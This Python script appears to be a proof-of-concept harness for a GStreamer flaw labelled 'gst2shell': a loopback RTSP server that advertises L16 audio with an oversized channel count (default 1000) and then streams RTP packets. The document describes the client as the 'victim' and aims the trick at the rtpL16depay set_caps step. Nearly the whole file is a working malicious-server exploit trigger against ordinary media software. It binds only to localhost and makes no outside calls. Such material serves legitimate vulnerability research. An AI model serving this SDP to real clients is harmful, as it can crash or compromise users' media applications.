#!/usr/bin/env python3
"""Minimal loopback RTSP server for gst2shell remote-caps reachability.

Serves a single audio track whose SDP rtpmap advertises L16/44100/<channels>.
Binds ONLY 127.0.0.1. Logs each RTSP request so the handshake is observable.
RTP media is generated after PLAY so rtspsrc propagates SDP-derived caps to
reach the victim rtspsrc -> rtpL16depay set_caps path.
"""
import socket
import sys
import threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18554
CHANNELS = int(sys.argv[2]) if len(sys.argv) > 2 else 1000

SDP = (
    "v=0\r\n"
    "o=- 0 0 IN IP4 127.0.0.1\r\n"
    "s=gst2shell-rtsp\r\n"
    "c=IN IP4 127.0.0.1\r\n"
    "t=0 0\r\n"
    "a=control:*\r\n"
    "m=audio 0 RTP/AVP 96\r\n"
    "a=rtpmap:96 L16/44100/%d\r\n" % CHANNELS
    + "a=control:trackID=1\r\n"
)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", PORT))
srv.listen(4)
print("RTSP listening 127.0.0.1:%d channels=%d" % (PORT, CHANNELS), flush=True)

SESSION = "12345678"


def handle(conn):
    conn.settimeout(6)
    try:
        buf = b""
        while True:
            try:
                chunk = conn.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            while b"\r\n\r\n" in buf:
                head, rest = buf.split(b"\r\n\r\n", 1)
                lines = head.decode("latin1").split("\r\n")
                req = lines[0]
                cseq = ""
                for ln in lines[1:]:
                    if ln.lower().startswith("cseq:"):
                        cseq = ln.split(":", 1)[1].strip()
                print("REQ %s (CSeq %s)" % (req, cseq), flush=True)
                method = req.split(" ")[0].upper()
                body = b""
                extra = ""
                if method == "OPTIONS":
                    extra = "Public: OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN, GET_PARAMETER\r\n"
                    code = "200 OK"
                elif method == "PLAY":
                    extra = (
                        "Session: %s;timeout=60\r\n" % SESSION
                        + "Range: npt=0.000-\r\n"
                        + "RTP-Info: url=rtsp://127.0.0.1:%d/trackID=1;seq=1;rtptime=0\r\n" % PORT
                    )
                    code = "200 OK"
                    # Send a few valid interleaved RTP packets so rtspsrc
                    # propagates its SDP-derived caps to the depay sink pad.
                    def _sender(c=conn):
                        import struct, time
                        for i in range(40):
                            rtp = (
                                struct.pack("!BBHII", 0x80, 96, 1 + i, 0, 0x11223344)
                                # 16 bytes: the fault is in set_caps, before any
                                # payload is consumed; size is irrelevant here.
                                + b"\x00" * 16
                            )
                            frame = b"$" + bytes([0]) + struct.pack("!H", len(rtp)) + rtp
                            try:
                                c.sendall(frame)
                            except Exception:
                                break
                            time.sleep(0.05)
                    threading.Thread(target=_sender, daemon=True).start()
                elif method == "DESCRIBE":
                    body = SDP.encode("latin1")
                    extra = (
                        "Content-Base: rtsp://127.0.0.1:%d/\r\n" % PORT
                        + "Content-Type: application/sdp\r\n"
                        + "Content-Length: %d\r\n" % len(body)
                    )
                    code = "200 OK"
                elif method == "SETUP":
                    extra = (
                        "Session: %s;timeout=60\r\n" % SESSION
                        + "Transport: RTP/AVP/TCP;unicast;interleaved=0-1\r\n"
                    )
                    code = "200 OK"
                elif method in ("TEARDOWN", "GET_PARAMETER"):
                    extra = "Session: %s\r\n" % SESSION
                    code = "200 OK"
                else:
                    code = "455 Method Not Valid In This State"
                resp = (
                    "RTSP/1.0 %s\r\n" % code
                    + "CSeq: %s\r\n" % cseq
                    + "Server: gst2shell-lab\r\n"
                    + extra
                    + "\r\n"
                ).encode("latin1") + body
                conn.sendall(resp)
                buf = rest
    except Exception as exc:
        print("CONN ERR %r" % exc, flush=True)
    finally:
        try:
            conn.close()
        except Exception:
            pass


while True:
    conn, addr = srv.accept()
    print("ACCEPT from %s" % (addr,), flush=True)
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
